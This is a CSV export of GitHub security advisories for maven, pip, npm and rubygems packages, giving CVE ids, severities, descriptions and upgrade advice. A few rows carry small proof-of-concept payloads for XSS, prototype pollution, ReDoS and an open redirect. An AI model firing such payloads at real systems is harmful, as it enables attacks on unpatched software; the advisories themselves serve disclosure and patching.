1165,34248,com.squareup.retrofit2:retrofit,GHSA-8p8g-f9vg-r7xr,CVE-2018-1000850,https://github.com/advisories/GHSA-8p8g-f9vg-r7xr,high,2018-12-21 17:48:19 UTC,Directory Traversal vulnerability in Square Retrofit,"Square Retrofit versions from (including) 2.0 to 2.5.0 (excluding) contain a Directory Traversal vulnerability in RequestBuilder class, method addPathParameter. By manipulating the URL an attacker could add or delete resources otherwise unavailable to her. This attack appears to be exploitable via an encoded path parameter on POST, PUT or DELETE request. This vulnerability appears to have been fixed in 2.5.0 and later.",maven
1166,33999,commons-fileupload:commons-fileupload,GHSA-7x9j-7223-rg5m,CVE-2016-1000031,https://github.com/advisories/GHSA-7x9j-7223-rg5m,critical,2018-12-21 17:51:51 UTC,Improper Access Control in commons-fileupload,Apache Commons FileUpload before 1.3.3 DiskFileItem File Manipulation Remote Code Execution,maven
1167,33999,commons-fileupload:commons-fileupload,GHSA-xx68-jfcg-xmmf,CVE-2014-0050,https://github.com/advisories/GHSA-xx68-jfcg-xmmf,high,2018-12-21 17:51:42 UTC,High severity vulnerability that affects commons-fileupload:commons-fileupload,"MultipartStream.java in Apache Commons FileUpload before 1.3.1, as used in Apache Tomcat, JBoss Web, and other products, allows remote attackers to cause a denial of service (infinite loop and CPU consumption) via a crafted Content-Type header that bypasses a loop's intended exit conditions.",maven
1168,33999,commons-fileupload:commons-fileupload,GHSA-fvm3-cfvj-gxqq,CVE-2016-3092,https://github.com/advisories/GHSA-fvm3-cfvj-gxqq,high,2018-12-21 17:47:47 UTC,High severity vulnerability that affects commons-fileupload:commons-fileupload,"The MultipartStream class in Apache Commons Fileupload before 1.3.2, as used in Apache Tomcat 7.x before 7.0.70, 8.x before 8.0.36, 8.5.x before 8.5.3, and 9.x before 9.0.0.M7 and other products, allows remote attackers to cause a denial of service (CPU consumption) via a long boundary string.",maven
1169,20412,luigi,GHSA-p69g-f978-xxv9,CVE-2018-1000843,https://github.com/advisories/GHSA-p69g-f978-xxv9,high,2018-12-20 22:01:39 UTC,Cross-Site Request Forgery (CSRF) in Luigi,"Luigi version prior to version 2.8.0; after commit 53b52e12745075a8acc016d33945d9d6a7a6aaeb; after GitHub PR spotify/luigi/pull/1870 contains a Cross ite Request Forgery (CSRF) vulnerability in API endpoint: /api/<method> that can result in Task metadata such as task name, id, parameter, etc. will be leaked to unauthorized users. This attack appear to be exploitable via The victim must visit a specially crafted webpage from the network where their Luigi server is accessible.. This vulnerability appears to have been fixed in 2.8.0 and later.",pip
1170,34025,org.springframework.security:spring-security-core,GHSA-27xw-p8v6-9jjr,CVE-2018-15801,https://github.com/advisories/GHSA-27xw-p8v6-9jjr,high,2018-12-20 22:01:31 UTC,Spring Security vulnerable to Authorization Bypass,"Spring Security versions 5.1.x prior to 5.1.2 contain an authorization bypass vulnerability during JWT issuer validation. In order to be impacted, the same private key for an honest issuer and a malicious user must be used when signing JWTs. In that case, a malicious user could fashion signed JWTs with the malicious issuer URL that may be granted for the honest issuer.",maven
1171,37757,ro.pippo:pippo-core,GHSA-rmm5-g63h-m6g9,CVE-2018-20059,https://github.com/advisories/GHSA-rmm5-g63h-m6g9,critical,2018-12-19 19:24:39 UTC,Improper Restriction of XML External Entity Reference in pippo-core,jaxb/JaxbEngine.java in Pippo 1.11.0 allows XXE.,maven
1172,19985,pycrypto,GHSA-cq27-v7xp-c356,CVE-2013-7459,https://github.com/advisories/GHSA-cq27-v7xp-c356,critical,2018-12-14 18:51:38 UTC,Buffer Overflow in pycrypto,Heap-based buffer overflow in the ALGnew function in block_templace.c in Python Cryptography Toolkit (aka pycrypto) allows remote attackers to execute arbitrary code as demonstrated by a crafted iv parameter to cryptmsg.py.,pip
1173,19842,urllib3,GHSA-www2-v7xj-xrc6,CVE-2018-20060,https://github.com/advisories/GHSA-www2-v7xj-xrc6,critical,2018-12-12 15:52:07 UTC,Exposure of Sensitive Information to an Unauthorized Actor in urllib3,"urllib3 before version 1.23 does not remove the Authorization HTTP header when following a cross-origin redirect (i.e., a redirect that differs in host, port, or scheme). This can allow for credentials in the Authorization header to be exposed to unintended hosts or transmitted in cleartext.",pip
1174,16049,socket.io,GHSA-qv2v-m59f-v5fw,CVE-2017-16031,https://github.com/advisories/GHSA-qv2v-m59f-v5fw,high,2018-11-07 00:29:37 UTC,Insecure randomness in socket.io,"Affected versions of `socket.io` depend on `Math.random()` to create socket IDs, and therefore the IDs are predictable. With enough information on prior IDs, an attacker may be able to guess the socket ID and gain access to socket.io servers without authorization.


## Recommendation

Update to v0.9.7 or later.",npm
1175,20253,python-gnupg,GHSA-r3vr-prwv-86g9,CVE-2014-1927,https://github.com/advisories/GHSA-r3vr-prwv-86g9,high,2018-11-06 23:14:39 UTC,High severity vulnerability that affects python-gnupg,"The shell_quote function in python-gnupg 0.3.5 does not properly quote strings, which allows context-dependent attackers to execute arbitrary code via shell metacharacters in unspecified vectors, as demonstrated using ""$("" command-substitution sequences, a different vulnerability than CVE-2014-1928.  NOTE: this vulnerability exists because of an incomplete fix for CVE-2013-7323.",pip
1176,20253,python-gnupg,GHSA-c2fx-8r76-gh36,CVE-2013-7323,https://github.com/advisories/GHSA-c2fx-8r76-gh36,high,2018-11-06 23:14:22 UTC,High severity vulnerability that affects python-gnupg,python-gnupg before 0.3.5 allows context-dependent attackers to execute arbitrary commands via shell metacharacters in unspecified vectors.,pip
1177,20253,python-gnupg,GHSA-vcr5-xr9h-mvc5,CVE-2014-1929,https://github.com/advisories/GHSA-vcr5-xr9h-mvc5,moderate,2018-11-06 23:12:48 UTC,Moderate severity vulnerability that affects python-gnupg,"python-gnupg 0.3.5 and 0.3.6 allows context-dependent attackers to have an unspecified impact via vectors related to ""option injection through positional arguments."" NOTE: this vulnerability exists because of an incomplete fix for CVE-2013-7323.",pip
1178,16013,handlebars,GHSA-9prh-257w-9277,CVE-2015-8861,https://github.com/advisories/GHSA-9prh-257w-9277,moderate,2018-10-23 17:20:12 UTC,Cross-Site Scripting in handlebars,"Versions of `handlebars` prior to 4.0.0 are affected by a cross-site scripting vulnerability when attributes in handlebar templates are not quoted.


## Proof of Concept
Template:
```<a href={{foo}}/>```

Input:
```{ 'foo' : 'test.com onload=alert(1)'}```

Rendered result:
```<a href=test.com onload=alert(1)/>```


## Recommendation

Update to version 4.0.0 or later.
Alternatively, ensure that all attributes in handlebars templates are encapsulated with quotes.",npm
1179,20092,ansible,GHSA-rh6x-qvg7-rrmj,CVE-2016-3096,https://github.com/advisories/GHSA-rh6x-qvg7-rrmj,high,2018-10-10 17:23:45 UTC,High severity vulnerability that affects ansible,"The create_script function in the lxc_container module in Ansible before 1.9.6-1 and 2.x before 2.0.2.0 allows local users to write to arbitrary files or gain privileges via a symlink attack on (1) /opt/.lxc-attach-script, (2) the archived container in the archive_path directory, or the (3) lxc-attach-script.log or (4) lxc-attach-script.err files in the temporary directory.",pip
1180,20092,ansible,GHSA-w64c-pxjj-h866,CVE-2015-3908,https://github.com/advisories/GHSA-w64c-pxjj-h866,moderate,2018-10-10 17:23:51 UTC,Moderate severity vulnerability that affects ansible,"Ansible before 1.9.2 does not verify that the server hostname matches a domain name in the subject's Common Name (CN) or subjectAltName field of the X.509 certificate, which allows man-in-the-middle attackers to spoof SSL servers via an arbitrary valid certificate.",pip
1181,16155,jsonwebtoken,GHSA-c7hr-j4mj-j2w6,CVE-2015-9235,https://github.com/advisories/GHSA-c7hr-j4mj-j2w6,critical,2018-10-09 00:38:30 UTC,Verification Bypass in jsonwebtoken,"Versions 4.2.1 and earlier of `jsonwebtoken` are affected by a verification bypass vulnerability. This is a result of weak validation of the JWT algorithm type, occuring when an attacker is allowed to arbitrarily specify the JWT algorithm.




## Recommendation

Update to version 4.2.2 or later.",npm
1182,18828,activerecord,GHSA-7phj-gmgx-2r66,,https://github.com/advisories/GHSA-7phj-gmgx-2r66,moderate,2018-09-17 21:58:09 UTC,Moderate severity vulnerability that affects activerecord,"Withdrawn, accidental duplicate publish.

activerecord/lib/active_record/nested_attributes.rb in Active Record in Ruby on Rails 3.1.x and 3.2.x before 3.2.22.1, 4.0.x and 4.1.x before 4.1.14.1, 4.2.x before 4.2.5.1, and 5.x before 5.0.0.beta1.1 does not properly implement a certain destroy option, which allows remote attackers to bypass intended change restrictions by leveraging use of the nested attributes feature.",rubygems
1183,18865,actionpack,GHSA-vwfg-qj3r-6v3r,,https://github.com/advisories/GHSA-vwfg-qj3r-6v3r,moderate,2018-09-17 21:57:47 UTC,Moderate severity vulnerability that affects actionpack,"Withdrawn, accidental duplicate publish.

The http_basic_authenticate_with method in actionpack/lib/action_controller/metal/http_authentication.rb in the Basic Authentication implementation in Action Controller in Ruby on Rails before 3.2.22.1, 4.0.x and 4.1.x before 4.1.14.1, 4.2.x before 4.2.5.1, and 5.x before 5.0.0.beta1.1 does not use a constant-time algorithm for verifying credentials, which makes it easier for remote attackers to bypass authentication by measuring timing differences.",rubygems
1184,16046,superagent,GHSA-8225-6cvr-8pqp,CVE-2017-16129,https://github.com/advisories/GHSA-8225-6cvr-8pqp,low,2018-08-09 20:13:01 UTC,Large gzip Denial of Service in superagent,"Affected versions of `superagent` do not check the post-decompression size of ZIP compressed HTTP responses prior to decompressing. This results in the package being vulnerable to a [ZIP bomb](https://en.wikipedia.org/wiki/Zip_bomb) attack, where an extremely small ZIP file becomes many orders of magnitude larger when decompressed. 

This may result in unrestrained CPU/Memory/Disk consumption, causing a denial of service condition.


## Recommendation

Update to version 3.7.0 or later.",npm
1185,18455,st,GHSA-72fg-jqhx-c68p,CVE-2017-16224,https://github.com/advisories/GHSA-72fg-jqhx-c68p,moderate,2018-08-06 21:33:31 UTC,Open Redirect in st,"st is a module for serving static files.

An attacker is able to craft a request that results in an `HTTP 301` (redirect) to an entirely different domain. 

A request for: `http://some.server.com//nodesecurity.org/%2e%2e` would result in a 301 to `//nodesecurity.org/%2e%2e` which most browsers treat as a proper redirect as `//` is translated into the current schema being used.

Mitigating factor: 

In order for this to work, `st` must be serving from the root of a server (`/`) rather than the typical sub directory (`/static/`) and the redirect URL will end with some form of URL encoded `..` (""%2e%2e"", ""%2e."", "".%2e""). 

Code example (provided by Xin Gao): 

[example.js]

```
var st = require('st') 
var http = require('http') 
http.createServer(st(process.cwd())).listen(1337)
```

```
$ curl -v http://localhost:1337//cve.mitre.com/%2e%2e
*   Trying ::1...
* TCP_NODELAY set
* Connected to localhost (::1) port 1337 (#0)
> GET //cve.mitre.com/%2e%2e HTTP/1.1
> Host: localhost:1337
> User-Agent: curl/7.54.0
> Accept: */*
>
< HTTP/1.1 301 Moved Permanently
< cache-control: public, max-age=600
< last-modified: Fri, 13 Oct 2017 22:56:33 GMT
< etag: ""16777220-46488904-1507935393000""
< location: //cve.mitre.com/%2e%2e/
< Date: Fri, 13 Oct 2017 22:56:41 GMT
< Connection: keep-alive
< Content-Length: 30
<
* Connection #0 to host localhost left intact
```


## Recommendation

Update to version 1.2.2 or later.",npm
1186,15847,moment,GHSA-hxf5-mg84-pj4m,,https://github.com/advisories/GHSA-hxf5-mg84-pj4m,moderate,2018-07-31 23:03:17 UTC,Moderate severity vulnerability that affects moment,"Withdrawn, accidental duplicate publish.

The duration function in the moment package before 2.11.2 for Node.js allows remote attackers to cause a denial of service (CPU consumption) via a long string, aka a ""regular expression Denial of Service (ReDoS).""",npm
1187,18540,is-my-json-valid,GHSA-ccq6-3qx5-vmqx,,https://github.com/advisories/GHSA-ccq6-3qx5-vmqx,moderate,2018-07-31 22:54:14 UTC,Moderate severity vulnerability that affects is-my-json-valid,"Withdrawn, accidental duplicate publish.

The is-my-json-valid package before 2.12.4 for Node.js has an incorrect exports['utc-millisec'] regular expression, which allows remote attackers to cause a denial of service (blocked event loop) via a crafted string.",npm
1188,16484,serve,GHSA-q2qh-cgc2-qhr3,CVE-2018-3712,https://github.com/advisories/GHSA-q2qh-cgc2-qhr3,moderate,2018-07-27 17:07:50 UTC,Directory Traversal in serve,"Affected versions of `serve` do not properly handle `%2e` (.) and `%2f` (/) characters, and allow the, characters to be used in paths. This can be used to traverse the directory tree and list content of any directory the user running the process has access to.

Mitigating factors:
This vulnerability only allows listing of directory contents and does not allow reading of arbitrary files.


## Recommendation

Update to version 6.4.9 later.",npm
1189,17284,pouchdb,GHSA-cgqv-x5cx-xvqh,CVE-2016-10546,https://github.com/advisories/GHSA-cgqv-x5cx-xvqh,critical,2018-07-26 16:22:08 UTC,Arbitrary Code Injection in pouchdb,"Affected versions of `pouchdb` do not properly sandbox the code execution engine which executes the map/reduce functions for temporary views and design documents. Under certain circumstances, an attacker could uses this to run arbitrary code on the server.


## Recommendation

Update to version 6.0.5 or later.",npm
1190,18808,lodash,GHSA-fvqr-27wr-82fm,CVE-2018-3721,https://github.com/advisories/GHSA-fvqr-27wr-82fm,low,2018-07-26 15:14:52 UTC,Prototype Pollution in lodash,"Versions of `lodash` before 4.17.5 are vulnerable to prototype pollution. 

The vulnerable functions are 'defaultsDeep', 'merge', and 'mergeWith' which allow a malicious user to modify the prototype of `Object` via `__proto__` causing the addition or modification of an existing property that will exist on all objects.




## Recommendation

Update to version 4.17.5 or later.",npm
1191,16065,marked,GHSA-x5pg-88wf-qq4p,CVE-2017-16114,https://github.com/advisories/GHSA-x5pg-88wf-qq4p,high,2018-07-24 20:10:52 UTC,Regular Expression Denial of Service in marked,"Affected versions of `marked` are vulnerable to a regular expression denial of service. 

The amplification in this vulnerability is significant, with 1,000 characters resulting in the event loop being blocked for around 6 seconds.


## Recommendation

Update to version 0.3.9 or later.",npm
1192,18253,aegir,GHSA-6xhf-x49c-m5m6,CVE-2017-16225,https://github.com/advisories/GHSA-6xhf-x49c-m5m6,high,2018-07-24 20:04:11 UTC,Github Token Leak in aegir,"Affected versions of `aegir` bundle and publish the current users github token to npm when `aegir-release` is executed.


## Recommendation

Update to version 12.0.8 or later.

If you used this module to do a release for your project you should invalidate the GitHub tokens that were leaked.",npm
1193,17811,decamelize,GHSA-q5c4-39f5-m68j,CVE-2017-16023,https://github.com/advisories/GHSA-q5c4-39f5-m68j,high,2018-07-24 20:00:17 UTC,Regular Expression Denial of Service in decamelize,"Affected versions of `decamelize` are susceptible to a denial of service vulnerability when user input is passed directly into `decamelize`.




## Recommendation

Update to version 1.1.2 or later.",npm
1194,18755,useragent,GHSA-pjmx-9xr3-82qr,CVE-2017-16030,https://github.com/advisories/GHSA-pjmx-9xr3-82qr,high,2018-07-24 19:59:13 UTC,ReDoS via long UserAgent header in useragent,"Affected versions of `useragent` are vulnerable to regular expression denial of service when an arbitrarily long `User-Agent` header is parsed.


## Proof of Concept
```
var useragent = require('useragent');

var badUserAgent = 'MSIE 0.0'+Array(900000).join('0')+'XBLWP';
var request = 'GET / HTTP/1.1\r\nUser-Agent: ' + badUserAgent + '\r\n\r\n';
console.log(useragent.parse(request));
```


## Recommendation

Update to version 2.1.13 or later.",npm
1195,16836,i18next,GHSA-cmh5-qc8w-xvcq,CVE-2017-16010,https://github.com/advisories/GHSA-cmh5-qc8w-xvcq,moderate,2018-07-24 19:58:33 UTC,Cross-Site Scripting in i18next,"Affected versions of `i18next` may fail to sanitize user input when certain configuration options are used. When using the `.init` method, passing interpolation options without passing an `escapeValue` will default to `undefined` rather than the assumed `true`. 

## Proof of Concept

```
var init = i18n.init({
  interpolation: {
    prefix: ""__"",
    suffix: ""__"",
    escapeValue: true
  }
}, function(){
  var test = i18n.t('__firstName__ __lastName__', {
        firstName: 'Bob',
        lastName: '[""foo"",""bar""]',
  });
  console.log(test);
});
```
When `escapeValue` is explicitly passed, the result of `test` is: 

```
&lt;script&gt;alert(1)&lt;&#x2F;script&gt; Johnson
```

This is supposed to be the default. However, if `escapeValue` is not included, the result is the unescaped string: 
 
```
<script>alert(1)</script> Johnson
```


## Recommendation

Update to version 3.4.4 or later.",npm
1196,17146,tough-cookie,GHSA-g7q5-pjjr-gqvp,CVE-2017-15010,https://github.com/advisories/GHSA-g7q5-pjjr-gqvp,high,2018-07-24 20:14:39 UTC,Regular Expression Denial of Service in tough-cookie,"Affected versions of `tough-cookie` are susceptible to a regular expression denial of service.

The amplification on this vulnerability is relatively low - it takes around 2 seconds for the engine to execute on a malicious input which is 50,000 characters in length.

If node was compiled using the `-DHTTP_MAX_HEADER_SIZE` however, the impact of the vulnerability can be significant, as the primary limitation for the vulnerability is the default max HTTP header length in node.


## Recommendation

Update to version 2.3.3 or later.",npm
1197,16182,mime,GHSA-wrvr-8mpx-r7pp,CVE-2017-16138,https://github.com/advisories/GHSA-wrvr-8mpx-r7pp,moderate,2018-07-20 16:20:52 UTC,mime Regular Expression Denial of Service when mime lookup performed on untrusted user input,"Affected versions of `mime` are vulnerable to regular expression denial of service when a mime lookup is performed on untrusted user input.


## Recommendation

Update to version 2.0.3 or later.",npm
1198,17356,fastify,GHSA-mq6c-fh97-4gwv,CVE-2018-3711,https://github.com/advisories/GHSA-mq6c-fh97-4gwv,high,2018-07-18 21:20:34 UTC,Denial of Service vulnerability with large JSON payloads in fastify,"Affected versions of `fastify` are vulnerable to a denial of service when processing a request with `Content-Type` set to `application/json` and a very large payload.


## Recommendation

Update to version 0.38.0 or later.",npm
1199,20776,pysaml2,GHSA-c2vx-49jm-h3f6,CVE-2016-10149,https://github.com/advisories/GHSA-c2vx-49jm-h3f6,high,2018-07-16 16:50:12 UTC,Pysaml2 does not sanitize XML responses,XML External Entity (XXE) vulnerability in PySAML2 4.4.0 and earlier allows remote attackers to read arbitrary files via a crafted SAML XML request or response.,pip
1200,20092,ansible,GHSA-c2w9-48qc-qpj4,CVE-2017-2809,https://github.com/advisories/GHSA-c2w9-48qc-qpj4,high,2018-07-13 15:16:54 UTC,Code injection in ansible,An exploitable vulnerability exists in the yaml loading functionality of ansible-vault before 1.0.5. A specially crafted vault can execute arbitrary python commands resulting in command execution. An attacker can insert python into the vault to trigger this vulnerability.,pip
1201,20343,oslo.middleware,GHSA-xcp8-hh74-f6mc,CVE-2017-2592,https://github.com/advisories/GHSA-xcp8-hh74-f6mc,moderate,2018-07-13 15:16:45 UTC,Moderate severity vulnerability that affects oslo.middleware,"python-oslo-middleware before versions 3.8.1, 3.19.1, 3.23.1 is vulnerable to an information disclosure. Software using the CatchError class could include sensitive values in a traceback's error message. System users could exploit this flaw to obtain sensitive information from OpenStack component error logs (for example, keystone tokens).",pip
1202,19985,pycrypto,GHSA-6528-wvf6-f6qg,CVE-2018-6594,https://github.com/advisories/GHSA-6528-wvf6-f6qg,high,2018-07-12 20:29:26 UTC,Pycrypto generates weak key parameters,"lib/Crypto/PublicKey/ElGamal.py in PyCrypto through 2.6.1 generates weak ElGamal key parameters, which allows attackers to obtain sensitive information by reading ciphertext data (i.e., it does not have semantic security in face of a ciphertext-only attack). The Decisional Diffie-Hellman (DDH) assumption does not hold for PyCrypto's ElGamal implementation.",pip
1203,19896,paramiko,GHSA-232r-66cg-79px,CVE-2018-7750,https://github.com/advisories/GHSA-232r-66cg-79px,critical,2018-07-12 20:29:30 UTC,Paramiko not properly checking authention before processing other requests,"transport.py in the SSH server implementation of Paramiko before 1.17.6, 1.18.x before 1.18.5, 2.0.x before 2.0.8, 2.1.x before 2.1.5, 2.2.x before 2.2.3, 2.3.x before 2.3.2, and 2.4.x before 2.4.1 does not properly check whether authentication is completed before processing other requests, as demonstrated by channel-open. A customized SSH client can simply skip the authentication step.",pip
1204,18932,sprockets,GHSA-pr3h-jjhj-573x,CVE-2018-3760,https://github.com/advisories/GHSA-pr3h-jjhj-573x,high,2018-06-20 22:18:58 UTC,Sprockets path traversal leads to information leak,"Specially crafted requests can be used to access files that exist on the filesystem that is outside an application's root directory, when the Sprockets server is used in production.
  
All users running an affected release should either upgrade or use one of the work arounds immediately.
  
Workaround:
  
In Rails applications, work around this issue, set `config.assets.compile = false` and `config.public_file_server.enabled = true` in an initializer and precompile the assets.

This work around will not be possible in all hosting environments and upgrading is advised.",rubygems
1205,16345,hapi,GHSA-vwrf-r5r4-7775,CVE-2015-9236,https://github.com/advisories/GHSA-vwrf-r5r4-7775,moderate,2018-06-07 19:43:25 UTC,Incorrect handling of CORS preflight request headers in hapi,"Versions of `hapi` prior to 11.0.0 implement CORS incorrectly, allowing for configurations that at best return inconsistent headers, and at worst allow cross-origin activities that are expected to be forbidden. 

If the connection has CORS enabled but one route has it off, and the route is not GET, the OPTIONS prefetch request will return the default CORS headers and then the actual request will go through and return no CORS headers. This defeats the purpose of turning CORS on the route.


## Recommendation

Update to version 11.0.0 or later.",npm
1206,16345,hapi,GHSA-rc8h-3fv6-pxv8,CVE-2015-9241,https://github.com/advisories/GHSA-rc8h-3fv6-pxv8,high,2018-06-07 19:43:15 UTC,Denial of Service in hapi,"Versions of `hapi` prior to 11.1.3 are affected by a denial of service vulnerability.

The vulnerability is triggered when certain input is passed into the If-Modified-Since or Last-Modified headers.

This causes an 'illegal access' exception to be raised, and instead of sending a HTTP 500 error back to the sender, hapi will continue to hold the socket open until timed out (default node timeout is 2 minutes).





## Recommendation

Update to v11.1.3 or later",npm
1207,17429,ecstatic,GHSA-vwjc-q9px-r9vq,CVE-2015-9242,https://github.com/advisories/GHSA-vwjc-q9px-r9vq,high,2018-06-07 19:43:11 UTC,Denial of Service in ecstatic,"Versions of `ecstatic` prior to 1.4.0 are affected by a denial of service vulnerability when certain input strings are sent via the `Last-Modified` or `If-Modified-Since` headers.

Parsing certain inputs with `new Date()` or `Date.parse()` cases v8 to crash. As ecstatic passes the value of the affected headers into one of these functions, sending certain inputs via one of the headers will cause the server to crash.



## Recommendation

Update to version 1.4.0 or later.",npm
1208,16516,hoek,GHSA-jp4x-w63m-7wgm,CVE-2018-3728,https://github.com/advisories/GHSA-jp4x-w63m-7wgm,moderate,2018-04-26 15:25:17 UTC,Prototype Pollution in hoek,"Versions of `hoek` prior to 4.2.1 and 5.0.3 are vulnerable to prototype pollution.

The `merge` function, and the `applyToDefaults` and `applyToDefaultsWithShallow` functions which leverage `merge` behind the scenes, are vulnerable to a prototype pollution attack when provided an _unvalidated_ payload created from a JSON string containing the `__proto__` property.

This can be demonstrated like so:

```javascript
var Hoek = require('hoek');
var malicious_payload = '{""__proto__"":{""oops"":""It works !""}}';

var a = {};
console.log(""Before : "" + a.oops);
Hoek.merge({}, JSON.parse(malicious_payload));
console.log(""After : "" + a.oops);
```

This type of attack can be used to overwrite existing properties causing a potential denial of service.


## Recommendation

Update to version 4.2.1, 5.0.3 or later.",npm
1209,18828,activerecord,GHSA-jmm9-2p29-vh2w,CVE-2011-0448,https://github.com/advisories/GHSA-jmm9-2p29-vh2w,high,2017-10-24 18:33:38 UTC,High severity vulnerability that affects activerecord,"Ruby on Rails 3.0.x before 3.0.4 does not ensure that arguments to the limit function specify integer values, which makes it easier for remote attackers to conduct SQL injection attacks via a non-numeric argument.",rubygems
1210,18865,actionpack,GHSA-4ww3-3rxj-8v6q,CVE-2011-0449,https://github.com/advisories/GHSA-4ww3-3rxj-8v6q,high,2017-10-24 18:33:38 UTC,High severity vulnerability that affects actionpack,"actionpack/lib/action_view/template/resolver.rb in Ruby on Rails 3.0.x before 3.0.4, when a case-insensitive filesystem is used, does not properly implement filters associated with the list of available templates, which allows remote attackers to bypass intended access restrictions via an action name that uses an unintended case for alphabetic characters.",rubygems
1211,34704,org.apache.hive:hive-exec,GHSA-rrfq-g5fq-fc9c,CVE-2018-11777,https://github.com/advisories/GHSA-rrfq-g5fq-fc9c,high,2018-11-21 22:25:04 UTC,Improper Authentication in hive:hive-exec,"In Apache Hive 2.3.3, 3.1.0 and earlier, local resources on HiveServer2 machines are not properly protected against malicious user if ranger, sentry or sql standard authorizer is not in use.",maven
1212,36522,org.apache.hive:hive-jdbc,GHSA-jmf4-pq78-f8vj,CVE-2018-1314,https://github.com/advisories/GHSA-jmf4-pq78-f8vj,moderate,2018-11-21 22:24:50 UTC,Moderate severity vulnerability that affects org.apache.hive:hive-jdbc,"In Apache Hive 2.3.3, 3.1.0 and earlier, Hive ""EXPLAIN"" operation does not check for necessary authorization of involved entities in a query. An unauthorized user can do ""EXPLAIN"" on arbitrary table or view and expose table metadata and statistics.",maven
1213,36522,org.apache.hive:hive-jdbc,GHSA-jf2m-435m-mxw8,CVE-2018-1282,https://github.com/advisories/GHSA-jf2m-435m-mxw8,critical,2018-11-21 22:24:34 UTC,SQL Injection in hive-jdbc,This vulnerability in Apache Hive JDBC driver 0.7.1 to 2.3.2 allows carefully crafted arguments to be used to bypass the argument escaping/cleanup that JDBC driver does in PreparedStatement implementation.,maven
1214,34704,org.apache.hive:hive-exec,GHSA-rxmr-c9jm-7mm8,CVE-2018-1284,https://github.com/advisories/GHSA-rxmr-c9jm-7mm8,low,2018-11-21 22:24:22 UTC,Exposure of Sensitive Information to an Unauthorized Actor in Apache hive,"In Apache Hive 0.6.0 to 2.3.2, malicious user might use any xpath UDFs (xpath/xpath_string/xpath_boolean/xpath_number/xpath_double/xpath_float/xpath_long/xpath_int/xpath_short) to expose the content of a file on the machine running HiveServer2 owned by HiveServer2 user (usually hive) if hive.server2.enable.doAs=false.",maven
1215,34704,org.apache.hive:hive-exec,GHSA-p639-xxv5-j383,CVE-2018-1315,https://github.com/advisories/GHSA-p639-xxv5-j383,low,2018-11-21 22:24:08 UTC,Incorrect Permission Assignment for Critical Resource in Apache hive,"In Apache Hive 2.1.0 to 2.3.2, when 'COPY FROM FTP' statement is run using HPL/SQL extension to Hive, a compromised/malicious FTP server can cause the file to be written to an arbitrary location on the cluster where the command is run from. This is because FTP client code in HPL/SQL does not verify the destination location of the downloaded file. This does not affect hive cli user and hiveserver2 user as hplsql is a separate command line script and needs to be invoked differently.",maven
1216,34704,org.apache.hive:hive-exec,GHSA-83r3-c79w-f6wc,CVE-2015-7521,https://github.com/advisories/GHSA-83r3-c79w-f6wc,high,2018-11-21 22:23:49 UTC,"High severity vulnerability that affects org.apache.hive:hive, org.apache.hive:hive-exec, and org.apache.hive:hive-service","The authorization framework in Apache Hive 1.0.0, 1.0.1, 1.1.0, 1.1.1, 1.2.0 and 1.2.1, on clusters protected by Ranger and SqlStdHiveAuthorization, allows attackers to bypass intended parent table access restrictions via unspecified partition-level operations.",maven
1217,34704,org.apache.hive:hive-exec,GHSA-w4x9-4f5x-8jj8,CVE-2014-0228,https://github.com/advisories/GHSA-w4x9-4f5x-8jj8,low,2018-11-21 22:23:29 UTC,"Low severity vulnerability that affects      org.apache.hive:hive-exec, org.apache.hive:hive, and org.apache.hive:hive-service","Apache Hive before 0.13.1, when in SQL standards based authorization mode, does not properly check the file permissions for (1) import and (2) export statements, which allows remote authenticated users to obtain sensitive information via a crafted URI.",maven
1218,28980,py-evm,GHSA-vqgp-4jgj-5j64,CVE-2018-18920,https://github.com/advisories/GHSA-vqgp-4jgj-5j64,high,2018-11-21 22:23:04 UTC,Improper Restriction of Operations within the Bounds of a Memory Bufferin py-evm,"Py-EVM v0.2.0-alpha.33 allows attackers to make a vm.execute_bytecode call that triggers computation._stack.values with '""stack"": [100, 100, 0]' where b'\x' was expected, resulting in an execution failure because of an invalid opcode. This is reportedly related to ""smart contracts can be executed indefinitely without gas being paid.""",pip
1219,36436,org.apache.qpid:proton-j,GHSA-xvch-r4wf-h8w9,CVE-2018-17187,https://github.com/advisories/GHSA-xvch-r4wf-h8w9,high,2018-11-21 22:22:21 UTC,Improper Certificate Validation in proton-j,"The Apache Qpid Proton-J transport includes an optional wrapper layer to perform TLS, enabled by use of the 'transport.ssl(...)' methods. Unless a verification mode was explicitly configured, client and server modes previously defaulted as documented to not verifying a peer certificate, with options to configure this explicitly or select a certificate verification mode with or without hostname verification being performed. The latter hostname verifying mode was not implemented in Apache Qpid Proton-J versions 0.3 to 0.29.0, with attempts to use it resulting in an exception. This left only the option to verify the certificate is trusted, leaving such a client vulnerable to Man In The Middle (MITM) attack. Uses of the Proton-J protocol engine which do not utilise the optional transport TLS wrapper are not impacted, e.g. usage within Qpid JMS. Uses of Proton-J utilising the optional transport TLS wrapper layer that wish to enable hostname verification must be upgraded to version 0.30.0 or later and utilise the VerifyMode#VERIFY_PEER_NAME configuration, which is now the default for client mode usage unless configured otherwise.",maven
1220,20024,notebook,GHSA-49qr-xh3w-h436,CVE-2018-19351,https://github.com/advisories/GHSA-49qr-xh3w-h436,moderate,2018-11-21 22:15:47 UTC,Moderate severity vulnerability that affects notebook,"Jupyter Notebook before 5.7.1 allows XSS via an untrusted notebook because nbconvert responses are considered to have the same origin as the notebook server. In other words, nbconvert endpoints can execute JavaScript with access to the server API. In notebook/nbconvert/handlers.py, NbconvertFileHandler and NbconvertPostHandler do not set a Content Security Policy to prevent this.",pip
1221,20024,notebook,GHSA-3p4q-x8f3-p7vq,CVE-2018-19352,https://github.com/advisories/GHSA-3p4q-x8f3-p7vq,moderate,2018-11-21 22:19:22 UTC,Moderate severity vulnerability that affects notebook,Jupyter Notebook before 5.7.2 allows XSS via a crafted directory name because notebook/static/tree/js/notebooklist.js handles certain URLs unsafely.,pip
1222,35045,org.apache.activemq:activemq-client,GHSA-m9w8-v359-9ffr,CVE-2018-11775,https://github.com/advisories/GHSA-m9w8-v359-9ffr,high,2018-10-19 16:42:27 UTC,Improper Certificate Validation in Apache activemq-client,TLS hostname verification when using the Apache ActiveMQ Client before 5.15.6 was missing which could make the client vulnerable to a MITM attack between a Java application using the ActiveMQ client and the ActiveMQ server. This is now enabled by default.,maven
1223,18839,rack,GHSA-hg78-4f6x-99wq,CVE-2018-16470,https://github.com/advisories/GHSA-hg78-4f6x-99wq,moderate,2018-11-15 15:58:58 UTC,Moderate severity vulnerability that affects rack,"There is a possible DoS vulnerability in the multipart parser in Rack before 2.0.6. Specially crafted requests can cause the multipart parser to enter a pathological state, causing the parser to use CPU resources disproportionate to the request size.",rubygems
